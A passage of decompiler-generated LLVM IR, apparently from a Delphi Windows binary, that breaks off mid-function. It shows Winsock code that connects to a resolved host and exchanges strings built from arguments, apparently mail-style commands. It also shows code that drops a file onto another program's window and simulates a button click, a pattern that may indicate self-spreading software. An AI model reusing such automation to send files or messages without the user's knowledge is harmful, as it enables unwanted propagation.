  %0 = call i32 @"@HandleFinally"(), !insn.addr !895
  ret i32 %0, !insn.addr !895
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !896
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !897
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !898
  %0 = call i32 @function_4036c8(), !insn.addr !899
  %1 = inttoptr i32 %0 to i8*, !insn.addr !900
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !901
  %3 = call i32 @"@FillChar"(), !insn.addr !902
  %4 = icmp eq %hostent* %2, null, !insn.addr !903
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !904

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !901
  %6 = add i32 %5, 12, !insn.addr !905
  %7 = inttoptr i32 %6 to i32*, !insn.addr !905
  %8 = load i32, i32* %7, align 4, !insn.addr !905
  %9 = inttoptr i32 %8 to i32*, !insn.addr !906
  %10 = load i32, i32* %9, align 4, !insn.addr !906
  %11 = inttoptr i32 %10 to i8*, !insn.addr !907
  %12 = load i8, i8* %11, align 1, !insn.addr !907
  %13 = sext i8 %12 to i32, !insn.addr !908
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !909
  br label %dec_label_pc_405653, !insn.addr !909

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !910
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !911
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !912
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !913
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !913
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !913
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !914
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !915
  %5 = trunc i32 %4 to i16, !insn.addr !915
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !916
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !917
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !917
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !918
  %9 = icmp eq i32 %8, -1, !insn.addr !919
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !920
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !920

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !921
  %11 = trunc i32 %10 to i16, !insn.addr !922
  %12 = call i16 @htons(i16 %11), !insn.addr !922
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !923
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !923
  %14 = sext i16 %12 to i32, !insn.addr !924
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !924
  %16 = icmp eq i32 %15, 0, !insn.addr !925
  %17 = icmp eq i1 %16, false, !insn.addr !926
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !926
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !926

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !927
  store i32 %8, i32* %18, align 4, !insn.addr !927
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !928
  br label %dec_label_pc_4056f2, !insn.addr !928

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !929
  %20 = load i32, i32* %19, align 4, !insn.addr !929
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !930
  %21 = add i32 %esp.0.reload, 8, !insn.addr !931
  %22 = inttoptr i32 %21 to i32*, !insn.addr !931
  store i32 4216591, i32* %22, align 4, !insn.addr !931
  %23 = call i32 @"@LStrClr"(), !insn.addr !932
  ret i32 %23, !insn.addr !933
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !934
  ret i32 %0, !insn.addr !934
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !935
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !936
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !937
  %2 = call i32 @WSACleanup(), !insn.addr !938
  ret i32 %2, !insn.addr !939
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !940
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !941
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !941
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !941
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !942
  %4 = call i32 @function_4036c8(), !insn.addr !943
  %5 = call i32 @StrCopy(), !insn.addr !944
  %6 = call i32 @function_406f48(i32 4), !insn.addr !945
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !946
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !947
  %9 = call i32 @"@LStrClr"(), !insn.addr !948
  ret i32 %9, !insn.addr !949
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !950
  ret i32 %0, !insn.addr !950
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !951
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !952
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !953
  %2 = call i32 @StrPas(), !insn.addr !954
  ret i32 %2, !insn.addr !955
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !956
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !956
  %esp.0.reg2mem = alloca i32, !insn.addr !956
  %ecx.0.reg2mem = alloca i32, !insn.addr !956
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !957
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !958
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !958
  br label %dec_label_pc_4057d9, !insn.addr !958

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !959
  %2 = inttoptr i32 %1 to i32*, !insn.addr !959
  store i32 0, i32* %2, align 4, !insn.addr !959
  %3 = add i32 %esp.0.reload, -8, !insn.addr !960
  %4 = inttoptr i32 %3 to i32*, !insn.addr !960
  store i32 0, i32* %4, align 4, !insn.addr !960
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !961
  %6 = icmp eq i32 %5, 0, !insn.addr !961
  %7 = icmp eq i1 %6, false, !insn.addr !962
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !962
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !962
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !962

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !963
  %9 = inttoptr i32 %8 to i32*, !insn.addr !963
  store i32 0, i32* %9, align 4, !insn.addr !963
  %10 = call i32 @function_4036b8(), !insn.addr !964
  %11 = call i32 @function_4036b8(), !insn.addr !965
  %12 = call i32 @function_4036b8(), !insn.addr !966
  %13 = call i32 @function_4036b8(), !insn.addr !967
  %14 = call i32 @function_4036b8(), !insn.addr !968
  %15 = call i32 @function_4036b8(), !insn.addr !969
  %16 = call i32 @function_4036b8(), !insn.addr !970
  %17 = add i32 %esp.0.reload, -20, !insn.addr !971
  %18 = inttoptr i32 %17 to i32*, !insn.addr !971
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !971
  store i32 %19, i32* %18, align 4, !insn.addr !971
  %20 = add i32 %esp.0.reload, -24, !insn.addr !972
  %21 = inttoptr i32 %20 to i32*, !insn.addr !972
  store i32 4217413, i32* %21, align 4, !insn.addr !972
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !973
  %23 = add i32 %esp.0.reload, -28, !insn.addr !973
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !973
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !974
  %25 = call i32 @function_405664(), !insn.addr !975
  %26 = icmp eq i32 %25, 0, !insn.addr !976
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !977
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !977
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !977

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !978
  %28 = inttoptr i32 %27 to i32*, !insn.addr !978
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !978
  %29 = add i32 %esp.0.reload, -36, !insn.addr !979
  %30 = inttoptr i32 %29 to i32*, !insn.addr !979
  %31 = add i32 %esp.0.reload, -40, !insn.addr !980
  %32 = inttoptr i32 %31 to i32*, !insn.addr !980
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !980
  %33 = call i32 @"@LStrCatN"(), !insn.addr !981
  %34 = call i32 @function_405724(), !insn.addr !982
  %35 = call i32 @function_4057a4(), !insn.addr !983
  %36 = call i32 @function_405724(), !insn.addr !984
  %37 = call i32 @function_4057a4(), !insn.addr !985
  %38 = call i32 @"@LStrCat"(), !insn.addr !986
  %39 = call i32 @function_405724(), !insn.addr !987
  %40 = call i32 @function_4057a4(), !insn.addr !988
  %41 = call i32 @"@LStrCat"(), !insn.addr !989
  %42 = call i32 @function_405724(), !insn.addr !990
  %43 = call i32 @function_4057a4(), !insn.addr !991
  %44 = add i32 %esp.0.reload, -44, !insn.addr !992
  %45 = inttoptr i32 %44 to i32*, !insn.addr !992
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !992
  %46 = add i32 %esp.0.reload, -48, !insn.addr !993
  %47 = inttoptr i32 %46 to i32*, !insn.addr !993
  store i32 %arg1, i32* %47, align 4, !insn.addr !993
  %48 = add i32 %esp.0.reload, -52, !insn.addr !994
  %49 = inttoptr i32 %48 to i32*, !insn.addr !994
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !994
  %50 = add i32 %esp.0.reload, -56, !insn.addr !995
  %51 = inttoptr i32 %50 to i32*, !insn.addr !995
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !995
  %52 = call i32 @"@LStrCatN"(), !insn.addr !996
  %53 = call i32 @function_405724(), !insn.addr !997
  %54 = call i32 @function_4057a4(), !insn.addr !998
  %55 = add i32 %esp.0.reload, -60, !insn.addr !999
  %56 = inttoptr i32 %55 to i32*, !insn.addr !999
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !999
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1000
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1000
  store i32 %arg2, i32* %58, align 4, !insn.addr !1000
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1001
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1001
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1001
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1002
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1002
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1002
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1003
  %64 = call i32 @function_405724(), !insn.addr !1004
  %65 = call i32 @function_4057a4(), !insn.addr !1005
  %66 = call i32 @function_405724(), !insn.addr !1006
  %67 = call i32 @function_4057a4(), !insn.addr !1007
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1008
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1008
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1008
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1009
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1009
  store i32 %arg1, i32* %71, align 4, !insn.addr !1009
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1010
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1010
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1010
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1011
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1011
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1011
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1012
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1012
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1012
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1013
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1013
  store i32 %arg2, i32* %79, align 4, !insn.addr !1013
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1014
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1014
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1014
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1015
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1015
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1015
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1016
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1016
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1016
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1017
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1017
  store i32 %arg3, i32* %87, align 4, !insn.addr !1017
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1018
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1018
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1018
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1019
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1019
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1019
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1020
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1020
  store i32 %arg4, i32* %93, align 4, !insn.addr !1020
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1021
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1021
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1021
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1022
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1022
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1022
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1023
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1023
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1024
  %101 = call i32 @function_405724(), !insn.addr !1025
  %102 = call i32 @function_4057a4(), !insn.addr !1026
  %103 = call i32 @function_405724(), !insn.addr !1027
  %104 = call i32 @function_4057a4(), !insn.addr !1028
  %105 = call i32 @function_405718(), !insn.addr !1029
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1030
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1030
  br label %dec_label_pc_405a10, !insn.addr !1030

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1031
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1031
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1032
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1033
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1034
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1034
  store i32 4217420, i32* %110, align 4, !insn.addr !1034
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1035
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1036
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1037
  ret i32 %113, !insn.addr !1038
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1039
  ret i32 %0, !insn.addr !1039
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1040
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1041
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1042
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1042
  store i32 %3, i32* %4, align 4, !insn.addr !1042
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1043
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1043
  %9 = add i8 %6, %8, !insn.addr !1043
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1043
  store i8 %9, i8* %10, align 1, !insn.addr !1043
  %11 = add i32 %2, 85, !insn.addr !1044
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1044
  %13 = load i8, i8* %12, align 1, !insn.addr !1044
  %14 = trunc i32 %1 to i8, !insn.addr !1044
  %15 = add i8 %13, %14, !insn.addr !1044
  store i8 %15, i8* %12, align 1, !insn.addr !1044
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1045
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1045
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1045
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1046
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1047
  %19 = add i32 %18, 1, !insn.addr !1047
  %20 = icmp eq i32 %19, 0, !insn.addr !1047
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1047
  %21 = icmp eq i1 %20, false, !insn.addr !1048
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1048

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1049
  %23 = call i32 @"@LStrClr"(), !insn.addr !1050
  br label %dec_label_pc_405b51, !insn.addr !1050

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1051
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1052
  ret i32 0, !insn.addr !1053
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1054
  ret i32 %0, !insn.addr !1054
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1055
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1056
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1057
  %2 = add i32 %1, -1, !insn.addr !1057
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1057
  ret i32 %0, !insn.addr !1058
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1059
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1060
  %2 = icmp eq i32 %0, 0, !insn.addr !1061
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1062
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1062

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1063
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1064
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1064
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1064
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1065
  %7 = icmp eq i1 %6, false, !insn.addr !1066
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1067
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1067

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1068
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1068
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1069
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1069
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1070
  %13 = icmp eq i1 %12, false, !insn.addr !1071
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1072
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1072

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1073
  %15 = add i32 %14, 22, !insn.addr !1074
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1075
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1075
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1076
  %18 = icmp eq i32* %17, null, !insn.addr !1077
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1078
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1078

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1079
  %20 = icmp eq i32* %19, null, !insn.addr !1080
  %21 = icmp eq i1 %20, false, !insn.addr !1081
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1081

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1082
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1082
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1082
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1083
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1084
  br label %dec_label_pc_405c7a, !insn.addr !1084

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1076
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1079
  store i32 20, i32* %19, align 4, !insn.addr !1085
  %27 = add i32 %26, 4, !insn.addr !1086
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1086
  store i32 0, i32* %28, align 4, !insn.addr !1086
  %29 = add i32 %26, 8, !insn.addr !1087
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1087
  store i32 0, i32* %30, align 4, !insn.addr !1087
  %31 = add i32 %26, 12, !insn.addr !1088
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1088
  store i32 0, i32* %32, align 4, !insn.addr !1088
  %33 = add i32 %26, 16, !insn.addr !1089
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1089
  store i32 0, i32* %34, align 4, !insn.addr !1089
  %35 = call i32 @function_4036c8(), !insn.addr !1090
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1091
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1091
  %37 = add i32 %26, 20, !insn.addr !1092
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1093
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1094
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1095
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1096
  %42 = call i32 @function_406ea8(i32 4218000, i32 2000, i32 -1), !insn.addr !1097
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1098
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1098
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1099
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1099
  %46 = icmp eq i1 %45, false, !insn.addr !1100
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1101
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1101

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1102
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1102
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1103
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1103
  br label %dec_label_pc_405c7a, !insn.addr !1103

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1104
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1104
  %51 = load i32, i32* %50, align 4, !insn.addr !1104
  ret i32 %51, !insn.addr !1105
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1106
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
